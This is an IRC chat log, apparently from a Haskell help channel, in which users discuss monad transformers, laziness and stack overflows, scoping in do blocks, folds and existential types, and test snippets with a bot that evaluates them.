03:35:23 <kallisti> this lets you modify the environment for a given action
03:35:36 <kallisti> after which the environment is restored
03:36:08 <Twisol> So from a usage point of view, transformers are like squishing multiple monads together into one place.
03:36:34 <kallisti> yes they let you piece together functionality from multiple monads.
03:36:40 <Twisol> That's impressive.
03:36:49 <kallisti> the typeclasses are what make it convenient to use.
03:36:58 <Taneb> Reader is like the (->) r Monad, and Writer is like the (,) w Monad.
03:37:04 <Taneb> I'm not sure what State is like
03:37:13 <kallisti> s -> (a, s)
03:37:33 <Twisol> yeah, I try not to think too hard about (->). The Applicative part of LYAH was brain-bending.
03:39:04 <Twisol> after a while it kind of sinks in, but it's still really weird D:
03:39:20 <kallisti> I don't use Writer very often, but I bet there are specific circumstances where it's very nice
03:39:40 <Taneb> It's good for logging
03:39:58 <Twisol> best I can come up with is that the Reader monad fills in the last argument of any action with the environment.
03:39:59 <kallisti> Twisol: the thing about monads is that when you first start learning about them you expect to find something more concrete
03:40:04 <kallisti> but it's not a concrete concept at all.
03:40:10 <burbul> I've been using Writer more than anything except List
03:40:20 <Twisol> I'm using Writer for my telnet parser
03:40:22 <burbul> It is really useful for iterating over data structures and collecting up soem value
03:40:33 <Taneb> I used it in my silly fibonacci program to track which fibonacci number we're at
03:40:35 <Twisol> I have a Writer that's essentially (current parser state, [list of events])
03:40:35 <kallisti> Twisol: yes that's exactly what Reader is
03:40:53 <kallisti> burbul: I typically just use explicit recursion there
03:41:03 <kallisti> or folds
03:41:11 <Taneb> :t fold
03:41:12 <lambdabot> Not in scope: `fold'
03:41:15 <burbul> I have -- and this is unavoidable -- a data structure with about 30 constructors
03:41:37 <kallisti> I use Reader and State quite a bit.
03:41:41 <burbul> I need to map across it in certain circumstances anyway
03:41:45 <nand`> I use RWST
03:41:47 <burbul> and I really wouldn't want to write a separate fold
03:41:58 <burbul> Because I would have to go through all the constructors again
03:42:00 <Taneb> I ended up with RWS Integer (Sum Integer) (Integer, Integer) ()
03:42:06 <burbul> I suppose you could define fold in terms of writer
03:42:08 <nand`> RWST ... IO
03:42:12 <nand`> imperative made easy
03:42:21 <Twisol> I was so much more productive before I found this channel. *laugh*
03:42:32 <kallisti> welcome to IRC.
03:42:39 <Twisol> too late for that, been here years
03:42:47 <burbul> RWST?
03:42:55 <Twisol> reader-writer-state-<no idea>
03:43:00 <kallisti> transformer
03:43:00 <Taneb> Transformer
03:43:04 <burbul> ah
03:43:17 <burbul> When do you need all of those together?
03:43:32 <b_jonas> always
03:43:32 <kallisti> occasionally. ;)
03:43:33 <Twisol> presumably, it's the recipe for imperative languages
03:43:36 <burbul> (And what you do gain over just using a three transformer stack?)
03:43:43 <kallisti> honestly I've never used RWST
03:43:46 <nand`> burbul: brevity
03:43:48 <arnsholt> What's the best source of docs for Parsec?
03:43:48 <Taneb> It's a literate Optimus Prime with a government and polulation
03:43:53 <b_jonas> actually I don't think imperative languages have a writer
03:44:03 <kallisti> print "Hello, World!"
03:44:10 <b_jonas> they usually have RS and exceptions
03:44:12 <Twisol> seems like that would fall under IO
03:44:17 <Taneb> "reader writer state transformer" has a nice rhythm
03:44:18 <b_jonas> and IO too
03:44:22 <nand`> burbul: reader for command args or config data; state for.. well, program state; writer for logging or other data collection (eg. actions to be performed) along the way
03:44:22 <kallisti> Writer is just a more general version of output
03:44:27 <kallisti> because you can do whatever with the result
03:44:38 <Taneb> Spondaic, I think
03:44:55 <Taneb> Spondaic tetrameter
03:44:57 <kallisti> more specifically, an accumulating output.
03:45:02 <b_jonas> but then, KittehT is better
03:45:12 <Twisol> Taneb: Harder better faster stronger.
03:45:30 <Twisol> Taneb: I swear. Now I hear RWST as sung by Daft Punk.
03:45:59 <kallisti> but of course, ContT is the only monad you need.
03:46:26 <arnsholt> Taneb: Three first feet are iambs. Not sure about transformer off-hand
03:46:37 <Twisol> I still don't even know how that one works yet. The only explanation I've read seemed so unlike any continuation/coroutine I've seen before.
03:46:45 <kallisti> nand`: I probably end up using just StateT when I could be using RWST
03:46:54 <Taneb> state trans is one foot, arnsholt
03:46:56 <Twisol> state-trans form-er
03:47:25 <nand`> Twisol: by the lambdas, you're right
03:47:50 <Twisol> I love how every culture has its own swear.
03:48:11 <kallisti> Twisol: it's different because there's no state to keep track of
03:48:21 <Twisol> Anyways, I need to get to bed. If it's not obvious, I'm slightly nutty.
03:48:24 <kallisti> because functions are pure.
03:48:49 <kallisti> me too.
03:49:14 <Twisol> kallisti: Right. I'd expect it to return an action that, when evaluated, runs the rest of the function left over from before.
03:49:15 <nand`> StateT is capable of everything a RWST is; since your state can simply be Monoid m => (s, r, m) as long as you promise not to use r and m correctly
03:49:16 <Taneb> kallisti is the purest one here
03:49:42 <b_jonas> nand`: not quite. writer can actually do things state can't, though that's not obvious.
03:50:00 <arnsholt> Point, point. Iambic tetrameter it is
03:50:05 <nand`> b_jonas: I'll take your word for it
03:50:51 <burbul> b_jonas: I'm curious about that...
03:51:20 <Twisol> k, off to bed. Night everyone, and thanks for all the help!
03:51:28 <Taneb> Goodnight!
03:54:15 <b_jonas> > {- this is what you can't do with State -} take 10 (execWriter (mapM_ (tell . (:[])) (enumFrom (0 :: Integer))))
03:54:17 <lambdabot>   [0,1,2,3,4,5,6,7,8,9]
03:55:28 <kallisti> sure you can.
03:55:37 <burbul> Can't you just hold a State [Int] ...
03:55:42 <burbul> and add numbers to it one by one?
03:55:55 <kallisti> yes
03:56:02 <kallisti> you can implement Writer entirely with State
03:56:49 <nand`> take 10 $ execState (mapM_ (modify . (:) . pure) (enumFrom (0 :: Integer))) []
03:56:52 <nand`> > take 10 $ execState (mapM_ (modify . (:) . pure) (enumFrom (0 :: Integer))) []
03:56:52 <lambdabot>   No instance for (GHC.Show.Show (f GHC.Integer.Type.Integer))
03:56:52 <lambdabot>    arising fro...
03:57:01 <b_jonas> > {- you can use the writer in RWS instead of the standalone Writer -} let { (_, _, w) = runRWS (mapM_ (tell . (:[])) (enumFrom (0 :: Integer))) () (); } in take 10 w
03:57:03 <lambdabot>   [0,1,2,3,4,5,6,7,8,9]
03:57:06 <nand`> oh
03:57:13 <b_jonas> burbul: you can't extract just part of the list then
03:57:17 <b_jonas> burbul: because there's no final list
03:57:20 <nand`> > take 10 $ execState (mapM_ (modify . (:)) (enumFrom (0 :: Integer))) []
03:57:26 <lambdabot>   mueval: ExitFailure 1
03:57:26 <lambdabot>  mueval: Prelude.undefined
03:57:27 <b_jonas> burbul: the state monad can't prove the take of the list converges
03:57:33 <b_jonas> burbul: the writer monad proves that
03:57:46 <b_jonas> so you can't get the state after an infinite computatino
03:58:03 <burbul> ah -- it's a laziness thing?
03:58:06 <burbul> I see
03:58:07 <b_jonas> but you can start to get the write output of an infinite computation without problems
03:58:14 <b_jonas> yes, laziness
03:58:15 <burbul> That was informative -- thanks!
03:58:30 <nand`> > take 10 $ execState (mapM_ (\x -> modify (++[x])) (enumFrom (0 :: Integer))) []
03:58:35 <lambdabot>   mueval-core: Time limit exceeded
03:59:27 <nand`> right
03:59:40 <burbul> my mutlipe StateT code is getting unwieldy with really long type names... I'm not sure whether to 'typedef' the stack, the transformers, or the actual things keeping track of state. Can anyone point me at nontrivial examples online? (All the tutorials have really simple stacks.)
04:00:19 <kallisti> > take 10 . reverse $ execState (mapM _ (\x -> modify (x:)) (enumFrom (0 :: Integer))) []
04:00:20 <lambdabot>   Pattern syntax in expression context: _
04:00:26 <kallisti> > take 10 . reverse $ execState (mapM_ (\x -> modify (x:)) (enumFrom (0 :: Integer))) []
04:00:30 <lambdabot>   mueval-core: Time limit exceeded
04:00:34 <womb> quick question on HXT runX is just like <- yes ?
04:01:57 <fmap> what "like <-" should mean?
04:02:03 <nand`> the problem with StateT is that, technically, you could write a function that if x > 10000000000 prepends instead of appending
04:03:12 <kallisti> womb: they're not equivalent, no.
04:03:35 <mm_freak_> absence: yeah
04:05:20 <kallisti> womb: in particular runX results in an IO computation
04:05:49 * hackagebot cabal2nix 1.32 - Convert Cabal files into Nix build instructions  http://hackage.haskell.org/package/cabal2nix-1.32 (PeterSimons)
04:05:56 <kallisti> runX is what you would apply to your whole IOStateArrow
04:06:01 <Taneb> :t fibs
04:06:04 <lambdabot> Not in scope: `fibs'
04:06:52 * kallisti thinks designing a Haskell library makes it easier to dive into another library and figure out what's going on.
04:06:57 <MasseR> Why does this http://hpaste.org/69129 run out of space when doing 'iterate hash "0" !! n' with big enough n?
04:08:41 <absence> mm_freak_: ok, thanks!
04:08:57 <kallisti> MasseR: my guess would be because it ends up constructing a lot of lists.
04:09:36 <kallisti> one for iteration
04:09:39 <kallisti> *each iteration
04:10:21 <kallisti> and they're not strictly evaluated so they're not freed until you traverse the result list.
04:10:31 <MasseR> kallisti: So iterate is not a good choice for that?
04:10:55 <kallisti> what large is n, specifically?
04:10:57 <kallisti> *how
04:11:01 <kallisti> help english
04:11:29 <mm_freak_> absence: to give you a more practical example:  a text label probably doesn't need to know the whole window…  it just needs to know the text it should display and possibly another widget it might be associated to
04:11:59 <mm_freak_> label :: MyWire (Text, Widget) Widget
04:12:37 <MasseR> kallisti: I tried with a million (just trying to compare how fast that runs compared to my php implementation)
04:12:54 <mm_freak_> label . fmap ("Enter your name:",) nameInput
04:13:26 <kallisti> MasseR: instead of using ++ and span try writing it as a single map.
04:13:34 <kallisti> or a fold perhaps
04:14:24 <kallisti> so all of the initial Z's become 0's and after that you apply the shift operation
04:14:30 <kallisti> all in one traversal, with no copies
04:14:37 <kallisti> ++ requires you to copy queue
04:14:50 <kallisti> I'm not sure how big these strings are, but that could be an issue.
04:15:15 <MasseR> kallisti: That's not an issue, unless we go to perhaps billions of iterations :)
04:15:33 <MasseR> with a million iteration it grows into 4 length string
04:16:00 <MasseR> I rewrote the iterate part with a custom tail-recursive iteration, and a million iterations works fine
04:16:12 <mm_freak_> > iterate succ 0 !! 1000000
04:16:14 <lambdabot>   *Exception: stack overflow
04:16:29 <nand`> @src iterate
04:16:30 <lambdabot> iterate f x =  x : iterate f (f x)
04:17:01 <mm_freak_> > fix (\r x -> x `seq` x : r (succ x)) 0 !! 1000000
04:17:02 <lambdabot>   1000000
04:17:09 <nand`> > let iterate' f x = x : iterate' f (f $! x) in iterate' succ 0 !! 1000000
04:17:10 <mm_freak_> 'iterate' is very lazy
04:17:10 <lambdabot>   *Exception: stack overflow
04:17:32 <kallisti> yes, that's the problem.
04:17:52 <mm_freak_> i recommend the 'fix' version above (you can rewrite it as 'let' for better readability)
04:18:01 <mm_freak_> it connects evaluation of the head to the (:) constructor of the list
04:18:12 <mm_freak_> so as you traverse the least, each iteration is evaluated
04:18:40 <kallisti> though he's dealing with strings
04:18:46 <kallisti> so he may want to use deepseq?
04:18:59 <mm_freak_> that's fine…  the point is to prevent the iteration thunks
04:19:10 <quicksilver> deepseq almost always a mistake
04:19:12 <MasseR> http://hpaste.org/69131 simple enough
04:19:14 <mm_freak_> > fix (\r x -> x `seq` x : r ('a' : x)) "" !! 1000000
04:19:15 <lambdabot>   "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa...
04:19:28 <quicksilver> great way to add an O(n) cost to each iteration - guarantee quadratic complexity :-)
04:19:30 <mm_freak_> and i agree with quicksilver
04:19:44 <mm_freak_> deepseq is almost always wrong =)
04:20:20 * kallisti is bad at understanding strictness vs. laziness
04:20:33 <quicksilver> I wonder if there would be any merit in an RTS feature to mark an object as being in NF so that deepseq could be O(1) from then on
04:20:39 <kallisti> whenever I think I get it, things like this pop up and I don't see how the solution solves the problem at all.
04:20:42 <mm_freak_> this has to do with the nonstrictness of the (:) constructor
04:20:44 <quicksilver> probably more expensive than worth it.
04:20:57 <mm_freak_> the nonstrictness of its first argument that is
04:21:10 <mm_freak_> the 'fix' variant emualtes a strict first argument to (:)
04:21:50 <mm_freak_> quicksilver: well, that would turn deepseq into a magic language feature
04:21:53 <kallisti> oh nevermind
04:21:54 <augur> i wonder if there's a way to change lazy functions into strict ones
04:21:55 <augur> like
04:21:56 <kallisti> I was looking at the iterate' version
04:22:14 <mm_freak_> augur: that doesn't really make sense
04:22:15 <augur> strict :: (a -> b) -> a -> b   ;   strict f (!x) = f x
04:22:18 <quicksilver> mm_freak_: of course.
04:22:19 <augur> or something
04:22:31 <kallisti> :t ($!)
04:22:31 <lambdabot> forall a b. (a -> b) -> a -> b
04:22:35 <nand`> I thought the succ tower was causing the stack overflow
04:22:36 <mm_freak_> augur: strict/non-strict is a property of the function's dependencies
04:22:41 <quicksilver> mm_freak_: that's part of what I meant by "more expensive"
04:22:44 <mm_freak_> nand`: not at all
04:23:13 <mm_freak_> nand`: the problem is that the tower is built in the first place
04:23:33 <kallisti> mm_freak_: yeah nevermind I understand. I was looking at the wrong code.
04:23:35 <mm_freak_> the proper solution is to have a (!!) that is strict on the list's elements as it traverses
04:24:05 <kallisti> I was optimizing at the wrong place. :P
04:24:23 <kallisti> trying to reduce the overhead of each individual iteration.
04:24:32 <mm_freak_> in other words:  create your data structures as lazily as possible and consume them as strictly as possible =)
04:24:42 <mm_freak_> this is usually a good rule of thumb
04:25:04 <mm_freak_> so in this particular case it's not 'iterate's fault, and it would be a bad idea to introduce iterate'
04:25:33 <mm_freak_> (!!) is the consumer, so it should force
04:26:04 <theorbtwo> (!!#)?
04:26:08 <kallisti> !!!
04:26:12 <mm_freak_> (!!')
04:26:16 <Twisol|sleep> !?
04:26:22 <kallisti> !!! is definitely the one
04:26:30 <mm_freak_> !!:->
04:27:31 <burbul> Is there a way to 'short circuit' the remainder of a do-block? (So, return a value and ignore everything that happens after.)
04:27:31 <kallisti> at least Haskell is nice
04:27:37 <kallisti> it doesn't give you stack overflows until you ask it to.
04:27:39 <mm_freak_> > let (x:_) !!:-> 0 = x; (x:xs) !!:-> n = xs !!:-> pred n in iterate succ 0 !! 1000000
04:27:41 <lambdabot>   *Exception: stack overflow
04:27:52 <mm_freak_> > let (x:_) !!:-> 0 = x; (x:xs) !!:-> n = x `seq` xs !!:-> pred n in iterate succ 0 !! 1000000
04:27:54 <lambdabot>   *Exception: stack overflow
04:27:57 <burbul> (i.e. something like 'continue' in an imperative language)
04:28:09 <mm_freak_> there we go…  me not understanding lazy evaluation =P
04:28:12 <b_jonas> burbul: you want an Either monad
04:28:15 <kallisti> burbul: in MonadPlus instances, yes
04:28:16 <mm_freak_> > let (x:_) !!:-> 0 = x; (!x:xs) !!:-> n = xs !!:-> pred n in iterate succ 0 !! 1000000
04:28:17 <lambdabot>   *Exception: stack overflow
04:28:18 <nand`> burbul: there is in MonadPlus, mzero >>= f = mzero
04:28:22 <kallisti> in IO, not without asynchronous exceptions
04:28:25 <nand`> ah, I was too slow
04:29:27 <burbul> Mmm... I need something like a 'if' statement.
04:29:40 <nand`> > if True then 5 else 0
04:29:41 <lambdabot>   5
04:29:48 <burbul> I want to read a value out of the StateT _, and then do one of two different things depending on a property of the value.
04:30:32 <kallisti> conditional execution? I don't think Haskell supports that yet.  :P
04:30:46 <burbul> At the moment the best I can do is http://hpaste.org/69132
04:30:56 <mm_freak_> burbul: use 'if'?
04:30:57 <burbul> I'd be grateful for any suggestions on how to make it nice!
04:31:14 <burbul> I always had the impression if was unidiomatic...
04:31:37 <kallisti> in do notation it's not.
04:31:45 <mm_freak_> it is idiomatic, why wouldn't it be?
04:31:46 <kallisti> I tend to prefer guards and case where possible
04:31:54 <kallisti> but it's just a matter of taste.
04:31:56 <burbul> kallisti: ah, ok -- thanks.
04:32:09 <mm_freak_> guards are a nice way, if you have a full pattern anyway
04:32:11 <burbul> mm_freak: I thought pattern matching was more idiomatic
04:32:37 <mm_freak_> burbul: in "x <- blah" the 'x' is sort of a semipattern
04:33:11 <mm_freak_> you would have to write a separate function or a variable case, which is more code and probably less readable than an ad hoc 'if'
04:33:37 * kallisti uses ifM these days. :)
04:33:38 <mm_freak_> write your code such that it is readable instead of trying to replace everything by pattern matches just because it's so novel =)
04:33:52 <kallisti> s/novel/idiomatic/
04:33:52 <mm_freak_> ifM would be nice to have…  just like caseM
04:33:55 <burbul> I ended up writing a separate function (in the hpaste example)
04:33:58 <kallisti> `hackage cond
04:34:04 <kallisti> @hackage cond
04:34:05 <lambdabot> http://hackage.haskell.org/package/cond
04:34:07 * kallisti coughs.
04:34:17 <mm_freak_> kallisti: idiomatic programming in haskell isn't much related to how you express a predicate =)
04:34:21 <mm_freak_> this is just code beauty
04:34:38 <kallisti> s/idiomatic/perceived idiomaticity/
04:34:40 <mm_freak_> if you have a predicate (a -> Bool), there is nothing wrong with using 'if'
04:35:28 <quicksilver> there is, I think, a reasonable sense it which "if" is non-idiomatic
04:35:36 <quicksilver> it doesn't "scale" and it isn't "first-class"
04:35:55 <quicksilver> so you often end up replacing it with something else when code evolves.
04:36:05 <mm_freak_> patterns and guards aren't first-class either
04:36:07 <quicksilver> so, it's non-idiomatic because it's a special case.
04:36:14 <mm_freak_> and if it evolves, it's not a predicate anymore =)
04:36:23 <kallisti> mm_freak_: I think allowing cases in lambdas more or less fixes the issue of not having a caseM
04:36:36 <quicksilver> however it's convenient and concise so personally I use it when it's the simplest solution.
04:36:59 <quicksilver> mm_freak_: patterns don't scale well either; they're best suited for simple data types or for local use.
04:37:05 <kallisti> though I suppose a caseM would be nice sugar.
04:37:06 <quicksilver> guards scale better
04:37:09 <mm_freak_> in any case, my personal standard is readability
04:37:20 <quicksilver> that's reasonable but unhelpful
04:37:33 <quicksilver> "readability" is just as subjective as "idiomatic"
04:37:34 <quicksilver> ;)
04:38:01 <kallisti> I actually don't use functions
04:38:07 <kallisti> I just make ReaderT stacks
04:38:23 <mm_freak_> i remember having a head of programmers, who wrote in his coding standard that it isn't allowed to line up "=" for multiple variable assignments (it was an imperative language) reasoning that it doesn't scale well unless you have an editor that can deal with them
04:38:54 <mm_freak_> this is a terrible reasoning IMO…  there is some reason in it, but it's mostly just arbitrary
04:39:17 <kallisti> that rule appeals to my sense of laziness, but disgusts the OCD centers of my brain.
04:39:26 <kallisti> which like neatly aligned columns.
04:39:49 <quicksilver> mm_freak_: a more serious objection IMO is that it makes diffs unreasonably noisy.
04:40:04 <quicksilver> this could be solved by the diff option which ignores whitespace
04:40:11 <ClaudiusMaximus> solution: use only 1 character variable names
04:40:12 <burbul> quicksilver: speaking of scaling,  there is a sense in which 'if' is bad in my example... I'm writing  if v `Map.member` map then return (map!v).
04:40:19 <mm_freak_> quicksilver: that would be a better reasoning at least
04:40:26 <quicksilver> but unfortunately most repo-browsing software doesn't seem to invoke diff with that option
04:40:26 <kallisti> solution: pointfree code. use no variables at all
04:40:50 <quicksilver> burbul: yeah, just use the version of lookup which returns the Maybe
04:40:57 <quicksilver> burbul: no point making it check twice
04:41:03 <quicksilver> check-and-then-do is a bad idiom
04:41:18 <quicksilver> (if there is an alternative API which is just "just-do-it-and-tell-me-if-it-didnt-work"
04:41:38 <mm_freak_> burbul: somehow i almost always end up putting the lookup in a pattern guard
04:41:40 <kallisti> also it needs to be an atomic failure.
04:41:43 <burbul> I know. I only wrote it that way temporarily. I'm in the middle of trying to figure out how to utilise the Maybe properly inside the do block
04:41:47 <quicksilver> :)
04:41:51 <kallisti> as in, it can't leave an environment in an inconsistent state.
04:41:58 <mm_freak_> so i might prevent myself conceptually from ever having to check for membership in an 'if' =)
04:42:03 <kallisti> burbul: with a case expression
04:42:11 <mm_freak_> | Just x <- M.lookup k m = ...
04:42:20 <kallisti> oh also that.
04:42:35 * kallisti always forgets about the pattern guards.
04:42:41 <burbul> mm_freak_: I could do that, but I'd have to fact out a separate function again, and it was pretty horrible.
04:42:48 <burbul> (In my case, not in general)
04:43:02 <hughfdjackson> i know people talk about the prelude having warts (i'm sure it does); from a beginners perspective, there's a giddying amount of lovely stuff in here
04:43:04 <mm_freak_> burbul: for membership there is also the option of folding the Maybe
04:43:33 <mm_freak_> maybe doThis doThatWith (M.lookup k m)
04:43:38 <mm_freak_> :t maybe
04:43:39 <lambdabot> forall b a. b -> (a -> b) -> Maybe a -> b
04:44:14 <kallisti> burbul: case expressions are your friend.
04:44:24 <kallisti> no functions required.
04:44:30 <burbul> Actually, I was just in the middle of trying to decide whether to go with case or maybe -- but thanks for the advice!
04:45:07 <mm_freak_> 'maybe' is nice to prevent the additional name for the result of the lookup
04:45:18 <burbul> case + Just x <-
04:45:23 <kallisti> for complex results I prefer case. if I can manage to keep it readable I go with maybe.
04:45:26 <int-e>  
04:45:28 <quicksilver> I like using case because I find it easier to read (see above for comment about readability being subjective)
04:45:30 <burbul> oh, sorry, I was about to say something stupid
04:45:36 <mm_freak_> if you can write your consuming function pointfreely 'maybe' is the better option…  if you want a name anyway, go with the pattern guard
04:45:40 <burbul> I'll write it both ways and see how they look.
04:45:47 <quicksilver> however I always feel guilty because 'maybe' seems a better solution really
04:46:08 <mm_freak_> folding is always the best option, but not always the most readable =)
04:46:54 <mm_freak_> and i think most haskellers would agree that folds are very idiomatic ;)
04:48:44 <burbul> btw, mm_freak, why did you refer to 'maybe' as a fold? I'd never thought of it that way...
04:49:07 <mm_freak_> burbul: a fold replaces constructors by a function
04:49:17 <mm_freak_> this is want 'maybe', 'either' and 'foldr' do
04:49:34 <mm_freak_> s/want/what/
04:50:06 <mm_freak_> (notably by this definition foldl is not a fold, and there is only one fold for each type)
04:50:30 <b_jonas> wouldn't that be uncons? a fold is a more advanced recursive thingy.
04:50:39 <mm_freak_> (notably 2 there is always an identity fold:  maybe Nothing Just, either Left Right, foldr (:) [])
04:51:15 <burbul> Interesting -- thank you!
04:51:34 <mm_freak_> b_jonas: i'm using a very generic definition of 'fold' motivated by bird/meertens
04:52:23 <mm_freak_> no reason to require recursiveness…  you can equally well define folds for any data type, and there is a theoretical beauty to it
04:52:32 <burbul> with the 'maybe' approach, I'm finding that my inner do-block (which is itself inside a where) can't access variables bound in the outer do block. is that normal, or am I doing something stupid?
04:52:37 <mm_freak_> the fold of the empty data type has this type:  foldEmpty :: Empty -> b
04:52:40 <mm_freak_> and this is sound =)
04:53:09 <quicksilver> burbul: the thing you're doing wrong is putting it in a where.
04:53:16 <k-zed> i have a possibly stupid typesystem-related question
04:53:16 <mm_freak_> burbul: this is not normal…  if you have the 'maybe' right as an action itself, all earlier variables should be in scope
04:53:19 <quicksilver> where clauses can't see bindings inside do blocks.
04:53:32 <quicksilver> unless the where clause is entirely withing the do block, of course
04:53:44 <mm_freak_> k-zed: in this channel there are really no stupid questions =)
04:53:44 <quicksilver> such as being attached to a let inside do, but it doesn't sound like that's what you mean.
04:53:51 <k-zed> let's say i want to provide a generic "data repository" in a module; which is a list of pairs, something like: (function: is this piece of data mine? , piece of data)
04:54:02 <k-zed> the kinds (types) of pieces of data may differ
04:54:12 <k-zed> let's say i want to use this repository to store all kinds of data
04:54:19 <k-zed> and i don't know before which kinds of data i want to store in it later
04:54:27 <k-zed> i.e. i don't want to declare all possible types beforehand
04:54:34 <burbul> the outer do block contains the where, and the where contains the inner do block
04:54:34 <mm_freak_> k-zed: you mean like a heterogenous map?
04:54:44 <k-zed> mm_freak_: yeah, i think so
04:54:59 <quicksilver> burbul: it must not "contain" it in the right sense, otherwise the variables would be visible.
04:55:09 <mm_freak_> k-zed: this is not straightforward with static typing…  you have to keep in mind that after compilation all typing information is gone
04:55:16 <quicksilver> burbul: I think you'll probably have to paste some code this is hard to talk about in the abstract.
04:55:26 <mm_freak_> k-zed: a common solution is to use an existential type, i.e. couple a type with operations
04:55:48 <k-zed> hm, i don't exactly understand :)
04:56:15 <burbul> Quicksilver: I'm just stripping out the extraneous material + will then hpaste it
04:56:15 <mm_freak_> conceptually:  Map Key (exists a. (a, a -> a))
04:56:49 <mm_freak_> k-zed: this basically means:  there exists a type 'a' for which you have a value and a function from it to itself
04:57:36 <mm_freak_> you know nothing about what type exactly, but you have a value and a function you can apply to it
04:57:44 <burbul> http://hpaste.org/69136
04:57:46 <k-zed> mm_freak_: meanwhile i found a page on existential types on haskellwiki
04:57:49 <k-zed> mm_freak_: is this the thing you mean?
04:57:53 <mm_freak_> yes
04:57:55 <k-zed> (if so, i'll try to read it)
04:58:06 <quicksilver> burbul: that where is not inside the do block.
04:58:09 <mm_freak_> "existential type" is a pretty much unambiguous term
04:58:21 <quicksilver> burbul: that where is attached to the top leve of the function not_in_scope_err
04:58:33 <quicksilver> burbul: you may not have a bare 'where' inside a do block like that.
04:58:50 <quicksilver> syntactically, 'where' attaches to declarations, and do is not a declaration, it's an expression.
04:58:51 <burbul> I thought I had indented it enough to go inside all of the statements in the do block
04:58:55 <burbul> ah
04:58:58 <burbul> I see -- thank you.
04:59:05 <k-zed> mm_freak_: thanks a lot for the pointer, this looks like something that could be useful for me
04:59:09 <k-zed> mm_freak_: i'll try to read&understand it
04:59:17 <mm_freak_> k-zed: are you a haskell beginner?
04:59:25 <quicksilver> burbul: your indentation does not change the syntactical structure of the language :) The interesting point is why that parsed, rather than being a syntax error.
04:59:31 <KSkrzet> I'm currently reading Yesod book chapter on Persistent. The examples are nice, but I would like to see complete documentation of model definition syntax. Is there any?
04:59:31 <k-zed> mm_freak_: yeah, pretty much
04:59:48 <mm_freak_> k-zed: experiment with it and explore why it's likely not what you want =)
04:59:52 <quicksilver> burbul: the language has a weird rule which is "if a token appears which is not syntactically valid, close the current layout construct(s) and try to parse it again"
05:00:04 <k-zed> mm_freak_: ok :)
05:00:19 <quicksilver> burbul: so because 'where' isn't valid in a do-block, a } got inserted and the where got attached to not_in_scope_err.
05:00:34 <quicksilver> burbul: your best bet is to use a "let create =" on the line after nc <- get
05:00:50 <quicksilver> burbul: (...or make nc a parameter to create and then pass it.)
05:01:24 <k-zed> mm_freak_: although i see i can define the possible "operations" i want to be possible on the data using typeclasses
05:01:30 <k-zed> that looks good enough
05:01:44 <k-zed> is there some sort of common pitfall that makes this a less used facility?
05:01:51 <mm_freak_> (i found that universal/existential quantification is difficult to understand in haskell mostly because you never pass and receive type arguments…  in fact CoC was the thing that made it click for me)
05:02:17 <mm_freak_> k-zed: it's probably not idiomatic, but anyway, experiment with it
05:02:31 <mm_freak_> it's nice to see its limitations =)
05:03:06 <mm_freak_> KSkrzet: the yesod book chapter covers pretty much all of it
05:03:17 <k-zed> what is universal/existential quantification, and what's CoC? :)
05:03:46 <mm_freak_> KSkrzet: Persistent is simple, easy to use and covers 95% of all use cases…  in all others you will probably add further instances =)
05:04:08 <quicksilver> the meme that you need a type class to bundle your existential with operations is a rather annoying one
05:04:13 <quicksilver> leading to overuse/abuse of typeclasses
05:04:27 <quicksilver> however that's not really important to k-zed at the moment, the main thing is it get the idea.
05:04:39 <mm_freak_> k-zed: technically they are type system features…  and i agree with quicksilver
05:04:43 <mm_freak_> don't use a type class
05:04:59 <mm_freak_> they will distract from the idea of existential types
05:05:29 <mm_freak_> a bare bones existential is this:  exists a. (a, a -> a, a -> Int, …)
05:05:32 <burbul> Could anyone tell me what 'warning: reduce duplication' means?  ( http://hpaste.org/69138 )
05:06:01 <t7> click the warning
05:06:17 <quicksilver> burbul: you've been using your photocopier too much, it's bad for the environment!
05:06:30 <t7> basicly move those definitions to the root scope
05:06:40 <mm_freak_> k-zed: and CoC is a typed lambda calculus that is more powerful than haskell's, but ignore that for now…  it was just a remark from my experience =)
05:06:46 <burbul> t7: clicking -- thanks!
05:07:01 <mm_freak_> k-zed: think of "forall" as a type argument and "exists" as a type result
05:07:50 <quicksilver> burbul: you may prefer to make functions "{get/put}VarMap" and "{get/put}NameCount" and use them instead of get and lift.get
05:07:55 <quicksilver> slightly easier to read, possibly.
05:08:05 <quicksilver> and gives you a level of abstraction if you change that monad stack later.
05:08:12 <quicksilver> (modify too if you use that)
05:08:35 <burbul> quicksilver: thanks! (twice, because I didn't knwo about modify)
05:08:54 <k-zed> mm_freak_: the wiki page mentions "exists" only in one place, regarding "Essential Haskell", but i guess that's something different
05:09:19 <mm_freak_> k-zed: there is no own syntax for "exists" in most haskell implementations including GHC
05:09:45 <mm_freak_> k-zed: in other words, haskell has no existential quantification as a first class type system feature, but you can define existential /types/
05:10:04 <mm_freak_> data ExistsSucc = forall a. ES (a, a -> a)
05:10:13 <sopvop> Ugh, I have a newtype MymonadT m a b, and can't make it into MonadTrans, because of kind errors. MonadTrans wants it MymonadT a m b.  Can this be fixed without changing type signature of MymonadT?
05:10:25 <mm_freak_> that's a value of type 'a' together with a function 'a -> a' for /some/ type 'a'
05:10:42 <mm_freak_> sopvop: nope
05:11:22 <mm_freak_> sopvop: a monad transformer is always a type of kind (* -> *) -> * -> *
05:11:48 <k-zed> mm_freak_: in this case, how can you do anything with this datatype?
05:11:49 <sopvop> And no way to rearrange arguments to this "type function"?
05:11:59 <k-zed> (if 'a' doesn't conform to any type class)
05:12:08 <mm_freak_> so if you have a type MyMonadT a m b, then you have a family of monad transformers:  forall a. (MyMonadT a :: (* -> *) -> * -> *)
05:12:37 <mm_freak_> k-zed: you can apply the function to the value =)
05:12:44 <mm_freak_> k-zed: ES (5, succ)
05:12:54 <mm_freak_> k-zed: ES ("a", ('b' :))
05:12:56 <mm_freak_> etc.
05:13:18 <mm_freak_> k-zed: type classes are just a convenience for exactly this
05:13:34 <k-zed> what i fail to understand is that ExistsSucc becomes a type that you can "pass around"
05:13:45 <k-zed> if you pass it around to somewhere else, that has no knowledge of the types within
05:13:49 <k-zed> what can you do there?
05:13:57 <mm_freak_> k-zed: ExistsSucc is just a type…  you could have:  Map Key ExistsSucc
05:14:18 <mm_freak_> ExistsSucc conceptually is a type A, a value x :: A and a function f :: A -> A
05:14:44 <mm_freak_> you can apply the function
05:14:50 <mm_freak_> there is nothing else you can do
05:15:02 <k-zed> right - in particular, you can do nothing with the result
05:15:07 <k-zed> except for applying the function to it
05:15:08 <k-zed> again :)
05:15:14 <mm_freak_> exactly =)
